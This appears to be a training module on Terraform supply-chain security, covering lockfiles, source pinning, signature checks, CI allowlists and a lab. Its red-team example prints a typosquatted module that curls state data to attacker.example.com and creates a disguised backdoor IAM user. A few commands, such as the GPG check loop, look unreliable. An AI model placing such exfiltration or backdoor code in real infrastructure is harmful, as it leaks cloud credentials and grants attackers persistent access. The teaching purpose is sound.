# 08 — IaC Supply Chain & Provider Trust

> **Level:** Intermediate–Advanced
> **Prereqs:** [08-02 — Terraform Secrets in State](./terraform-secrets-in-state.md), [08-05 — Static Analysis Checkov/tfsec](./static-analysis-checkov-tfsec.md), [03-09 — Supply Chain Security for Containers](../Compute-Container-Security/supply-chain.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Initial Access, Persistence, Execution
> **Authorization scope:** Run registry queries and dependency checks against your own Terraform code only.

## What & why

Every Terraform module and provider you reference from a public registry is third-party code that runs with your cloud privileges during `terraform init`, `plan`, and `apply`. A compromised provider can exfiltrate state secrets, create backdoor resources, or execute arbitrary code on the CI runner. The dependency lockfile (`.terraform.lock.hcl`) and provider source verification are your supply-chain integrity controls.

## The OnPrem reality

Internal Python/PHP/Ruby mirrors mirrored PyPI, Packagist, and RubyGems. A security team would vet packages before allowing them in the internal mirror. Terraform's registry model is closer to Docker Hub than PyPI — providers are binaries, not just code, and they execute during every Terraform operation.

```bash
# Pre-cloud: internal Python mirror + vetting
pip install --index-url https://pypi.internal.example.com/simple/ requests
# Security team had already reviewed requests==2.28.1
```

## Core concepts

| Concept | Description | Risk if ignored |
|---|---|---|
| `.terraform.lock.hcl` | Records provider version + platform hashes | Without it, `terraform init` pulls latest matching constraint |
| Provider registry | HashiCorp Registry (default) or custom | Compromised registry = compromised provider binary |
| Module registry | Terraform Registry / GitHub source | Typosquat modules with backdoors in `main.tf` |
| Provider signing | HashiCorp signs official providers | Must verify; custom providers are unsigned unless you sign them |
| Registry mirror | Internal proxy/cache for providers | Air-gapped environments need a trusted local copy |
| `required_providers` block | Pins provider source and version constraints | `source = "hashicorp/aws"` — the namespace matters |

## Cross-cloud registry & signing

| Concern | AWS | Azure | GCP | OnPrem |
|---|---|---|---|---|
| Official Terraform provider | `hashicorp/aws` | `hashicorp/azurerm` | `hashicorp/google` | — |
| Verified modules | AWS-maintained (`terraform-aws-modules`) | Azure Verified Modules (AVM) | GCP Cloud Foundation Toolkit (CFT) | Internal only |
| Provider signing | HashiCorp GPG key | Same | Same | Self-signed or internal CA |
| Bicep modules (Azure-native) | N/A | AVM — verified by Microsoft | N/A | N/A |
| Pulumi providers | `pulumi/pulumi-aws` | `pulumi/pulumi-azure-native` | `pulumi/pulumi-gcp` | Self-managed |

> (as of June 2026, HashiCorp has not rolled out signing for Terraform Registry modules; only providers are GPG-signed. See [HashiCorp's module signing roadmap](https://discuss.hashicorp.com/) for current status.)

## Provider trust — the lockfile

### `.terraform.lock.hcl` anatomy

```hcl
# Generated by `terraform init` — commit this to git
provider "registry.terraform.io/hashicorp/aws" {
  version     = "5.40.0"
  constraints = "~> 5.40"
  hashes = [
    "h1:vnFdR2OxCLhFnOQxqBcYb+YjNMrH3BH+P1oH1cGRPBw=",  # linux_amd64
    "h1:si3TmdHTWvOjDgWULkjYp8Kq0O+A0t+EHnQCJh9kzqA=",  # darwin_arm64
    "zh:a1b2c3d4...",                                        # zip hash (source)
  ]
}
```

```bash
# Verify the lockfile was generated correctly
terraform providers lock \
  -platform=linux_amd64 \
  -platform=darwin_arm64

# Check if any provider has changed since last init
terraform init -verify-plugins=true
```

**Why lockfiles matter:**

```bash
# Without lockfile — terraform init resolves to latest matching constraint
# Provider 5.42.0 could be released tomorrow with a vulnerability
terraform init  # pulls 5.42.0 silently

# With lockfile committed — terraform init uses exact version
terraform init  # uses 5.40.0 from lockfile, or fails if not cached
```

## AWS

```hcl
terraform {
  required_version = ">= 1.6.0, < 2.0.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.40.0"  # pin to minor
    }
    random = {
      source  = "hashicorp/random"
      version = "~> 3.6.0"
    }
  }
}

# Module sources — pin by tag/SHA, not branch
module "vpc" {
  source = "git::https://github.com/terraform-aws-modules/terraform-aws-vpc.git?ref=v5.8.1"
  # NOT: source = "git::...?ref=main" — mutable target
}

module "security_group" {
  source  = "terraform-aws-modules/security-group/aws"
  version = "5.1.0"  # registry module — pinned by version
}
```

```bash
# CI step: verify provider signatures after init
terraform init

# Extract and verify provider GPG signatures (manual check)
for provider in .terraform/providers/registry.terraform.io/hashicorp/*/*/terraform-provider-*_*; do
  gpg --verify "${provider}_SHA256SUMS.sig" "${provider}_SHA256SUMS" 2>&1 || \
    echo "SIGNATURE FAILURE for $provider"
done
```

## 🔴 Red Team view

**Typosquatting attack on Terraform Registry.**

An attacker publishes a module with a name confusingly similar to a popular module, containing a malicious `main.tf` or `data` source that exfiltrates state.

**Contained example:**

```hcl
# What developer intends:
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "5.8.1"
}

# What attacker publishes (typosquat):
module "vpc" {
  source  = "terraform-aws-modules/vpc/awss"  # note: "awss"
  version = "0.1.0"
}
```

The malicious module's `main.tf`:
```hcl
# Inside terraform-aws-modules/vpc/awss
data "external" "exfil" {
  program = ["curl", "-X", "POST", "https://attacker.example.com/collect",
             "-d", "@-"]
  query = {
    state = jsonencode({
      caller = data.aws_caller_identity.current
    })
  }
}
resource "aws_iam_user" "backdoor" {
  name = "backdoor-user-${random_string.suffix.result}"
  tags = { Purpose = "TotallyNormalMonitoring" }
}
```

**Provider malware — the higher-stakes vector:**

A compromised provider binary (e.g., a backdoored `hashicorp/aws` uploaded to a look-alike registry) runs arbitrary code during `terraform plan` with the CI runner's privileges. It can:
- Read `~/.aws/credentials`
- Read environment variables
- Access the state file on disk
- Write files, make network calls

**Artifacts:**
- CloudTrail: API calls from unexpected source IPs (the provider's embedded callbacks)
- `terraform init` output showing unrecognized provider source
- Registry download logs showing first use of a new module/provider namespace
- `.terraform.lock.hcl` diff showing new provider entry (code review should catch this)

## 🔵 Blue Team view

**Preventive controls:**

1. **Commit `.terraform.lock.hcl` — never `.gitignore` it:**

   ```bash
   # Verify lockfile is tracked
   git ls-files .terraform.lock.hcl

   # CI gate: ensure lockfile is present and has no uncommitted changes
   git diff --exit-code .terraform.lock.hcl || \
     echo "ERROR: .terraform.lock.hcl has uncommitted changes — run 'terraform providers lock'"
   ```

2. **Restrict provider sources — CI gate:**

   ```bash
   #!/bin/bash
   # Only allow providers from hashicofficial
   ALLOWED_SOURCES=(
     "registry.terraform.io/hashicorp/"
     "registry.terraform.io/terraform-aws-modules/"
     "terraform.internal.example.com/"
   )

   for provider in $(grep -oP 'source\s*=\s*"\K[^"]+' **/*.tf | sort -u); do
     allowed=false
     for src in "${ALLOWED_SOURCES[@]}"; do
       if [[ "$provider" == "$src"* ]]; then allowed=true; break; fi
     done
     if [ "$allowed" = false ]; then
       echo "BLOCKED: Unapproved provider source: $provider"
       exit 1
     fi
   done
   ```

3. **Module source pinning policy:**

   | Source type | Required pinning | Example |
   |---|---|---|
   | Registry module | `version` attribute (semver) | `version = "~> 5.0"` |
   | GitHub source | `?ref=<tag>` (not branch) | `?ref=v5.8.1` |
   | Local path | N/A (trusted) | `source = "../modules/vpc"` |
   | HTTP URL | SHA256 checksum of archive | Rare — avoid if possible |

4. **Egress proxy — block unknown registries:**

   ```bash
   # CI runner egress rules (allowlist)
   # Allow: registry.terraform.io, github.com, internal mirror
   # Deny: all other outbound HTTPS from CI runner
   ```

5. **CODEOWNERS for provider and module references:**

   ```
   # Any change to provider sources or versions requires security review
   **/versions.tf       @example-org/security-team
   **/providers.tf      @example-org/security-team
   **/.terraform.lock.hcl @example-org/security-team
   ```

6. **Provider checksum verification — CI:**

   ```yaml
   # GitHub Actions — verify provider checksums match lockfile
   - name: Verify providers
     run: |
       terraform init -input=false
       # Compare installed providers to lockfile hashes
       diff <(terraform providers lock -platform=linux_amd64 -platform=darwin_arm64 2>&1 | grep "^  hash" | sort) \
            <(grep "h1:" .terraform.lock.hcl | sort) || \
            echo "WARNING: Provider hash mismatch"
   ```

**Detection checklist:**
- [ ] `.terraform.lock.hcl` committed to git (not in `.gitignore`)
- [ ] Provider sources restricted to `hashicorp/*` + internal mirror
- [ ] Module sources pinned by `version` or `?ref=<tag>` (never `main`)
- [ ] CI gate verifies no unapproved provider sources
- [ ] Egress proxy blocks non-allowlisted registries from CI runner
- [ ] CODEOWNERS enforces security review on provider/module changes
- [ ] Daily scan: compare installed provider hashes against known-good hashes
- [ ] Module source whitelist: only `terraform-aws-modules/*`, `Azure/*`, `terraform-google-modules/*` + internal

## Hands-on lab

1. Inspect the lockfile and practice pinning:
   ```bash
   mkdir lab-supply-chain && cd lab-supply-chain

   cat > versions.tf <<'EOF'
   terraform {
     required_version = ">= 1.6.0"
     required_providers {
       aws = { source = "hashicorp/aws", version = "~> 5.40" }
       random = { source = "hashicorp/random", version = "~> 3.6" }
     }
   }
   EOF

   cat > main.tf <<'EOF'
   resource "random_id" "test" {
     byte_length = 4
   }
   module "s3_bucket" {
     source  = "terraform-aws-modules/s3-bucket/aws"
     version = "4.1.0"
     bucket  = "supply-chain-lab-${random_id.test.hex}-111111111111"
   }
   EOF
   ```

2. Run init and examine the lockfile:
   ```bash
   terraform init
   cat .terraform.lock.hcl
   # Observe: hashes are recorded for each provider+platform
   ```

3. Simulate a supply-chain check — verify hashes:
   ```bash
   terraform providers lock -platform=linux_amd64 -platform=darwin_arm64
   # If hashes changed from lockfile, this would alert
   ```

4. CI simulation — block unapproved provider:
   ```bash
   # This script would run in CI
   grep -rn 'source\s*=\s*"' . --include="*.tf" | grep -v 'hashicorp/' | grep -v 'terraform-aws-modules/'
   # Empty output = all sources approved
   ```

5. **Teardown:** `rm -rf lab-supply-chain`
